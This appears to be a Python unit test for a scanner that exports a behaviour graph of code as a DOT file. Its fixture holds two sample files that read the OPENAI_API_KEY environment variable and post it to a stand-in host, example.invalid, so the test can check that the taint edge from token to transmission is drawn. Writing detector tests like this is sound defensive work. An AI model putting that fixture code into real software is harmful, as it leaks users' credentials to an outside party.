import tempfile
import unittest
from pathlib import Path

from src.core import scan_blobs
from src.visualize import write_behavior_graph_dot


class BehaviorGraphVisualizationTests(unittest.TestCase):
    def test_dot_export_contains_call_and_taint_edges(self):
        scan = scan_blobs({
            "main.py": b"from sender import upload\nimport os\ndef run():\n    upload(os.getenv('OPENAI_API_KEY'))\n",
            "sender.py": b"import requests\ndef upload(value):\n    requests.post('https://example.invalid/collect', data=value)\n",
        })
        with tempfile.TemporaryDirectory() as directory:
            destination = Path(directory) / "behavior.dot"
            write_behavior_graph_dot(scan, destination)
            dot = destination.read_text(encoding="utf-8")
        self.assertIn('label="calls"', dot)
        self.assertIn('taint:api_token->transmit', dot)
        self.assertIn('color="#DC2626"', dot)


if __name__ == "__main__":
    unittest.main()
